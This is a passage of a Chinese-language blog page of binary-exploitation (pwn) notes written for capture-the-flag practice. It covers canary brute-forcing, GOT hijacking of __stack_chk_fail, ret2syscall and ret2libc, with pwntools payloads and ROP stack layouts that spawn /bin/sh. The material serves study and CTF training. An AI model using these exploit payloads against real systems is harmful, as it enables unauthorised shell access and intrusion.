</span></span><span class=line><span class=cl><span class=c1># Found at offset xxx</span></span></span></code></pre></div></div><h3 id=逐字节爆破>逐字节爆破</h3><p><strong>漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>pid_t</span> <span class=n>pid</span> <span class=o>=</span> <span class=nf>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span><span class=k>break</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span><span class=nf>wait</span><span class=p>(</span><span class=mi>0</span><span class=p>);}</span> <span class=c1>// 父进程
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>else</span> <span class=p>{</span><span class=nf>vuln</span><span class=p>();}</span> <span class=c1>//子进程
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span></span></span></code></pre></div></div><p><strong>利用：逐字节爆破</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>canary</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>padding</span> <span class=o>+</span> <span class=n>canary</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline_contains</span><span class=p>(</span><span class=s1>&#39;stack smashing detected&#39;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>canary</span><span class=o>+=</span><span class=n>p8</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span></span></span></code></pre></div></div><h3 id=劫持函数>劫持函数</h3><ul><li><p>劫持<code>__stack_chk_fail</code>函数，其为 libc 中的函数，动态链接在 plt 表中</p></li><li><p>修改 got 表中<code>__stack_chk_fail</code>函数地址为 backdoor 地址或 gadget 地址，触发 canary 来 getshell</p></li><li><p>可以通过格式化字符串实现地址写</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fmtstr_payload</span><span class=p>(</span><span class=n>off</span><span class=p>,</span> <span class=p>{</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;__stack_chk_fail&#39;</span><span class=p>]:</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;backdoor&#39;</span><span class=p>]})</span></span></span></code></pre></div></div></li></ul><h3 id=覆盖初始值>覆盖初始值</h3><ol><li>动态链接：TLS 结构体所在内存可写，canary 与 libc 基址有固定偏移</li><li>静态链接：TLS 结构体在堆 heap 中，也可写</li></ol><p>当 malloc 一段极大 size 的区域时，主要由 mmap 来实现，此时该区域将靠近 libc，</p><h2 id=rop>ROP</h2><p><strong>Return Oriented Programming——返回导向编程：适用于 NX 开启情况</strong></p><p>amd64：构造覆盖栈</p><table><thead><tr><th>system</th></tr></thead><tbody><tr><td>/bin/sh</td></tr><tr><td>pop_rdi_ret（previous return address）</td></tr></tbody></table><p>解析：ret 时即(pop eip)此时栈顶为<code>/bin/sh</code>，执行<code>pop rdi</code>，<code>/bin/sh</code>进入<code>rdi</code>，继续 ret 到<code>system</code>执行函数。</p><p><strong>无 pop rdi 时</strong></p><ol><li><code>pop rdi </code>的机器码是 <code>5f c3</code>，而 <code>pop r15 </code>的机器码是 <code>41 5f c3</code>，且一般<code>pop r15</code>之后一般都是紧跟 ret 指令</li><li>可以使用<code>pop r15</code>指令的后半部分，即 <code>5f (pop rdi)</code></li></ol><h3 id=ret2syscall>ret2syscall</h3><p><strong>系统调用</strong>：<strong>x86</strong> 通过 <code>int 0x80</code> 指令系统调用，<strong>amd64</strong> 通过 <code>syscall</code> 指令系统调用</p><p><strong>32 位</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-Assembly data-lang=Assembly># x86
mov eax, 0xb            ;系统调用号
mov ebx, [&#34;/bin/sh&#34;]    ;参数
mov ecx, 0
mov edx, 0
int 0x80                ;中断号
# &lt;==&gt; execve(&#34;/bin/sh&#34;, NULL, NULL)</code></pre></div><p>eax 有时也可由函数返回值来控制，如 alarm 第一次调用返回上次设置的 alarm 的剩余时间 0</p><img src=/img/pwn_note.zh-cn.assets/172844664600911.png alt=图片无法加载><p>存在大量的 <code>pop xxx; ret</code>的指令，使得拼接这些 gadget 为 payload</p><ul><li>覆盖返回地址后运行到 ret（pop eip），即将栈顶元素的值（指向 gadget 的地址）给 eip，此时 eip 指向了 gadget 并执行 gadget 的内容（pop; ret），此时的 pop 仍然将栈上的值弹出，此时的栈为给指定的寄存器存入值，然后 ret 继续下一步操作，在 Text 段中的 gadget 中连续跳转，最终调用 system call</li><li>可以找 libc 中的 gadget（需要泄露 libc 基地址）；也可以找程序中的 gadget</li></ul><img src=/img/pwn_note.zh-cn.assets/172844664601012.png alt=图片无法加载>
<img src=/img/pwn_note.zh-cn.assets/172844664601013.png alt=图片无法加载><p><strong>构造栈</strong>：</p><table><thead><tr><th>int 0x80 address</th></tr></thead><tbody><tr><td>/bin/sh address</td></tr><tr><td>0</td></tr><tr><td>0</td></tr><tr><td>pop_edx_ecx_ebx_ret address</td></tr><tr><td>0xb</td></tr><tr><td>pop_eax_ret address (previous ret address)</td></tr></tbody></table><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1>#使用 flat 函数来构造 ROP字节流</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>padding</span><span class=o>+</span><span class=mh>0x4</span><span class=p>),</span> <span class=n>pop_eax_ret</span><span class=p>,</span> <span class=mh>0xb</span><span class=p>,</span> <span class=n>pop_edx_ecx_ebx_ret</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>bin_sh</span><span class=p>,</span> <span class=n>int_ret</span> <span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># flat([gadget1, gadget2, gadget3])</span></span></span></code></pre></div></div><ul><li>若 system 传入的参数<strong>一定包括其他数据</strong>则可以填写<code>"||sh"</code>使得执行<code>system("xxxx||sh")</code></li></ul><p><strong>64 位</strong></p><p>构造栈：使用<strong>linux 系统调用</strong></p><table><thead><tr><th>syscall address</th><th></th></tr></thead><tbody><tr><td>0</td><td></td></tr><tr><td>0</td><td></td></tr><tr><td>pop_rsi_rdx_ret address</td><td></td></tr><tr><td>/bin/sh address</td><td></td></tr><tr><td>pop_rdi_ret address</td><td></td></tr><tr><td>0x3b</td><td>(execve 调用号)</td></tr><tr><td>pop_rax_ret address</td><td>(previous ret address)</td></tr></tbody></table><p><strong>system 无<code>/bin/sh</code>可以通过栈溢出构造出 read，将/bin/sh 写入到 bss 段中，再 system(bss_addr)</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=nv>elf</span> <span class=o>=</span> ELF<span class=o>(</span><span class=s2>&#34;./pwn&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>read_addr</span> <span class=o>=</span> elf.plt<span class=o>[</span><span class=s1>&#39;read&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 构造利用链</span>
</span></span><span class=line><span class=cl><span class=c1># read(0, bss_addr, 0x10)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span> b<span class=s1>&#39;a&#39;</span>*padding + b<span class=s1>&#39;b&#39;</span>*ebp_padding
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p64<span class=o>(</span>pop_rdi_ret<span class=o>)</span> + p64<span class=o>(</span>0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p64<span class=o>(</span>pop_rdx_ret<span class=o>)</span> + p64<span class=o>(</span>bss_addr<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p64<span class=o>(</span>pop_rsi_ret<span class=o>)</span> + p64<span class=o>(</span>0x10<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p64<span class=o>(</span>read_addr<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># system(bss)</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p64<span class=o>(</span>pop_rdi_ret<span class=o>)</span> + p64<span class=o>(</span>bss<span class=o>)</span> + p64<span class=o>(</span>system<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>io.send<span class=o>(</span>payload<span class=o>)</span>
</span></span><span class=line><span class=cl>io.send<span class=o>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=o>)</span> <span class=c1># read函数读入到bss</span></span></span></code></pre></div></div><h3 id=ret2libc>ret2libc</h3><p><strong>漏洞点</strong>：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>char</span> <span class=n>s</span><span class=p>;</span><span class=c1>//    [esp+1Ch] [ebp-64h]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>gets</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>);</span></span></span></code></pre></div></div><p>思路：篡改栈帧上自返回地址开始的一段区域为一系列 gadget 地址，最终调用 libc 中的函数获取 shell</p><p>通用形式：</p><table><thead><tr><th>32 位</th><th>or</th><th>64 位</th></tr></thead><tbody><tr><td>&ldquo;/bin/sh&rdquo;</td><td></td><td>&ldquo;/bin/sh&rdquo;</td></tr><tr><td>BBBB</td><td></td><td>pop_ret</td></tr><tr><td>system</td><td></td><td>system</td></tr></tbody></table><p><strong>32 位</strong></p><p>puts 或 write 泄露 libc 基址：<code>write(1,buf,20)</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>padding</span><span class=o>+</span><span class=n>ebp</span><span class=p>)</span> <span class=o>+</span> <span class=n>write</span><span class=nd>@plt</span> <span class=o>+</span> <span class=n>main</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>+</span> <span class=n>write</span><span class=nd>@got</span> <span class=o>+</span> <span class=mi>20</span>
</span></span><span class=line><span class=cl><span class=c1># padding &gt; 返回地址 &gt; 预留返回地址 &gt; arg1 &gt; arg2 &gt; arg3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>padding</span><span class=o>+</span><span class=n>ebp</span><span class=p>)</span> <span class=o>+</span> <span class=n>puts</span><span class=nd>@plt</span> <span class=o>+</span> <span class=n>main</span> <span class=o>+</span> <span class=n>puts</span><span class=nd>@got</span> <span class=c1># elf.got[&#39;puts&#39;]</span></span></span></code></pre></div></div><ul><li>程序中存在 system 函数，plt 表中可找到，plt 表存在 system 可以直接用</li><li><strong>32 位程序</strong>传参是通过栈传参，用 ROP 在栈布置参数</li></ul><p>构建栈：</p><table><thead><tr><th>0</th><th>【exit 的参数】</th></tr></thead><tbody><tr><td>&ldquo;/bin/sh&rdquo; address</td><td>【传给 system 的是 binsh 的地址】</td></tr><tr><td>exit()</td><td>【0xdeadbeef 任意一个地址】</td></tr><tr><td>system@plt libc.sym[&lsquo;system&rsquo;]</td><td>【previous return address】</td></tr></tbody></table><ul><li><code>system@got → & system → system code</code>，ret 的时候覆盖<code>& system</code>地址</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241028230609575.png alt=图片无法加载><p><strong>解释为何<code>system</code>和<code>"/bin/sh"</code>以及<code>exit</code>和<code>0</code>要相隔 1 字节：（也是 ROP 链）</strong></p><ul><li>返回地址覆盖为了<code>system</code>函数地址，通过 <code>ret</code> 即 <code>pop eip</code> 将<code>system</code>地址 pop 给<code>eip</code>寄存器，<code>eip</code>指向 system 函数</li><li>执行 system 函数开头汇编为<code>push ebp; mov ebp, esp</code>，所以先向栈中 push 了一个 ebp，之后便是将局部变量 local var 压入栈中</li><li>被调用函数一般寻找参数是从局部变量向上经过调用函数的 ebp、返回地址后找参数 arg1,2,3&mldr;.，而此时刚好距离 arg1——"/bin/sh"相差一个 ebp 和一个 exit()函数，相隔 2 字节，即找到相应的参数</li><li>而之后 exit()函数地址刚好为 system 原返回地址的位置，则继续同样操作达成 ROP 链利用</li></ul><img src=/img/pwn_note.zh-cn.assets/172844664601116.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./ret2libc&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=n>padding</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>system_plt</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>bin_sh</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>无"/bin/sh"情况</strong></p><ul><li>需要使用 ROP 来 gets 用户输入的/bin/sh 写入程序中的缓冲区中，再调用 system 函数</li><li>或找程序或 libc 文件中是否有 sh 或/bin/sh</li><li>找任何一个含有"sh"字符的字符串</li><li><strong>获得 shell 权限也可通过<code>system($0)</code>实现，<code>$0</code>在机器码中为<code>\x24\x30</code></strong></li></ul><table><thead><tr><th>buf = &ldquo;/bin/sh&rdquo;</th></tr></thead><tbody><tr><td>buf</td></tr><tr><td>system@plt</td></tr><tr><td>gets@plt</td></tr><tr><td>aaaaaaaaaa</td></tr></tbody></table><p>覆盖为 get 函数后，还需要手动输入"/bin/sh"最后会存储到 buf 中</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#加入\x00避免被阻塞</span></span></span></code></pre></div></div><p>通过数值输入将<code>/bin/sh</code>输入</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span> <span class=c1># b&#39;&#39; -&gt; int -&gt; str -&gt; b&#39;&#39;</span></span></span></code></pre></div></div><p><strong>plt 表中不存在 system 函数</strong></p><ol><li>无法直接使用，需要泄露出 system 函数的实际地址，<strong>泄露主 GOT，攻击主 PLT</strong></li><li>泄露 libc 地址：通过其他的类似 puts 函数来泄露真实 libc 中 puts 的地址（<code>got</code>表地址）</li><li>本地存在 libc 文件而程序运行时，libc 会被加载入内存的虚拟空间中，即使经过了映射，函数之间的偏移是一样的，puts 地址获取后可以获取 system 函数地址</li><li>本地和远程 libc 版本可能不一样，且由于 ASLR，泄露地址必须<strong>灵活</strong></li><li>尝试<code>p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(0) + p64(execve)</code></li></ol><p><strong>程序不能返回 puts 在 libc 中的地址</strong></p><ul><li><p>则需要 ROP 来获取 libc 中的函数真实地址</p></li><li><p>一种方法是通过 ROPgadget 来达到系统调用 write 函数来输出 got 表 puts 函数地址</p></li><li><p>另一种方法是直接将已有的 write@plt 覆盖返回地址，然后传入参数输出 got 表 puts 函数地址</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># 32位</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;aaaa&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>symols</span><span class=p>[</span><span class=s2>&#34;write&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>new_retn_address</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;write&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># 向标准输出写4个字节，输出write函数got表地址</span>
</span></span><span class=line><span class=cl><span class=c1># hex(u32(b&#39;\xaa\xbb\xcc\xdd&#39;)) 获取泄露输出的十六进制地址</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 64位</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;aaaaaaaa&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_r15_ret_addr</span><span class=p>)</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>           <span class=n>p64</span><span class=p>(</span><span class=n>write</span><span class=nd>@got</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>write</span><span class=nd>@plt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>           <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>new_retn_address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>           <span class=c1># 0xdeadbeef传给r15，r15是多余的</span>
</span></span><span class=line><span class=cl>           <span class=c1># 8是给rdx的值，即写出一个字节</span></span></span></code></pre></div></div><p><strong>64 位</strong></p><p><strong>二次运行</strong></p><p>若只有一次 gets 需要覆盖返回地址进行二次运行，回到 main 或 vuln 函数</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># 泄露puts_got表模板</span>
</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span> <span class=c1># 泄露libc后更改为libc.sym[&#39;environ&#39;]可泄露栈附近地址</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span> <span class=n>padding</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_plt</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>vul_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>leak_puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span></span></span></code></pre></div></div><ul><li>当<code>rdi</code>中存储<code>libc</code>的固定偏移函数如<code>funlockfile</code>时，覆盖返回地址为 puts 直接打印地址泄露 libc 地址</li><li>下一项由于 puts 无需参数直接填入 main 函数地址进行二次运行</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># 获取libc基址 int(xxx, 16) 将十六进制转换为整型；接受数据直到\n并将\n丢弃drop</span>
</span></span><span class=line><span class=cl><span class=n>libcBase</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>drop</span> <span class=o>=</span> <span class=kc>True</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># getshell</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=n>cyclic</span><span class=p>(</span><span class=mi>60</span><span class=p>),</span> <span class=n>libcBase</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>],</span> <span class=mh>0xdeadbeef</span><span class=p>,</span> <span class=nb>next</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)))</span></span></span></code></pre></div></div><p><strong>system 执行</strong></p><ul><li>程序需要栈平衡！</li><li>也可覆盖为 one_gadget 地址</li></ul><table><thead><tr><th>system_address</th></tr></thead><tbody><tr><td>bin_sh_address</td></tr><tr><td>pop_rdi_ret_address 覆盖返回地址</td></tr><tr><td>padding=buf_size + 0x8(rbp)</td></tr></tbody></table><ul><li><p><code>pop rdi</code>地址跳转到<code>pop rdi</code>，执行<code>pop rdi</code>将<code>/bin/sh</code>字符串所在地址<code>pop</code>到<code>rdi</code>中，</p></li><li><p>执行<code>pop rdi; ret</code>中的<code>ret</code>指令，跳转到<code>system</code>函数地址执行<code>system</code>函数</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 